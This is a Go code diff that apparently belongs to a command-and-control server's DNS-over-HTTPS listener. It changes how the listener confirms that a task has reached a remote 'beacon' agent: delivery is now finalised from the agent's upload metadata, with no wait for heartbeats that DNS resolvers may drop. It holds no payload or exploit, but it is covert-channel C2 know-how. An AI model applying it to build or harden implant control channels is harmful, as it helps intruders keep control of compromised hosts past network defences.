@@ -303,23 +303,57 @@ func (d *DoHListener) handlePutFragment(sid string, seq int, data []byte) {
 					meta.Version, meta.MetaFlags, sid, len(data))
 			}
 		}
-		if dohDebug && (meta.MetaFlags&0x1) != 0 {
+
+		// If agent confirms full downlink receipt via PUT meta, we can finalize delivery here.
+		// This avoids relying on HB(A) for ACK in recursive DNS environments where HB may be cached/dropped.
+		// Safety: only finalize when there is an inflight downFrags entry AND downAckOffset equals df.total.
+		if (meta.MetaFlags & 0x1) != 0 {
+			var ackTaskNonce uint32 = 0
+			var dfTotal uint32 = 0
+			var shouldAck bool = false
+
 			d.mu.Lock()
 			df, hasDf := d.downFrags[sid]
 			if hasDf && df != nil {
-				fmt.Printf("[BeaconDoH-DNS] [PUT-ACK] sid=%s downAckOffset=%d df.total=%d df.taskNonce=%08x\n",
-					sid, meta.DownAckOffset, df.total, df.taskNonce)
-				if meta.DownAckOffset < df.total {
-					fmt.Printf("[BeaconDoH-DNS] [PUT-ACK] sid=%s not complete (need %d)\n", sid, df.total)
-				} else if meta.DownAckOffset > df.total {
-					fmt.Printf("[BeaconDoH-DNS] [PUT-ACK] sid=%s overshoot (df.total=%d)\n", sid, df.total)
-				} else {
-					fmt.Printf("[BeaconDoH-DNS] [PUT-ACK] sid=%s complete-offset observed; waiting for HB ackTaskNonce to finalize\n", sid)
+				dfTotal = df.total
+				ackTaskNonce = df.taskNonce
+				if dohDebug {
+					fmt.Printf("[BeaconDoH-DNS] [PUT-ACK] sid=%s downAckOffset=%d df.total=%d df.taskNonce=%08x\n",
+						sid, meta.DownAckOffset, df.total, df.taskNonce)
 				}
-			} else {
+				if df.total > 0 && meta.DownAckOffset == df.total {
+					shouldAck = true
+				} else if dohDebug {
+					if meta.DownAckOffset < df.total {
+						fmt.Printf("[BeaconDoH-DNS] [PUT-ACK] sid=%s not complete (need %d)\n", sid, df.total)
+					} else if meta.DownAckOffset > df.total {
+						fmt.Printf("[BeaconDoH-DNS] [PUT-ACK] sid=%s overshoot (df.total=%d)\n", sid, df.total)
+					}
+				}
+			} else if dohDebug {
 				fmt.Printf("[BeaconDoH-DNS] [PUT-ACK] sid=%s downAckOffset=%d but no inflight downFrags\n", sid, meta.DownAckOffset)
 			}
 			d.mu.Unlock()
+
+			if shouldAck {
+				if dohDebug {
+					fmt.Printf("[BeaconDoH-DNS] [PUT-ACK] Finalizing delivery via PUT | sid=%s ackOffset=%d taskNonce=%08x\n",
+						sid, dfTotal, ackTaskNonce)
+				}
+				if err := d.ts.TsAgentAckDelivery(sid, ackTaskNonce); dohDebug {
+					if err != nil {
+						fmt.Printf("[BeaconDoH-DNS] [PUT-ACK] TsAgentAckDelivery ERROR | sid=%s taskNonce=%08x err=%v\n", sid, ackTaskNonce, err)
+					} else {
+						fmt.Printf("[BeaconDoH-DNS] [PUT-ACK] TsAgentAckDelivery OK | sid=%s taskNonce=%08x\n", sid, ackTaskNonce)
+					}
+				}
+
+				d.mu.Lock()
+				if cur, ok := d.downFrags[sid]; ok && cur != nil && cur.taskNonce == ackTaskNonce {
+					delete(d.downFrags, sid)
+				}
+				d.mu.Unlock()
+			}
 		}
 		if len(rest) <= 8 {
 			_ = d.ts.TsAgentProcessData(sid, rest)
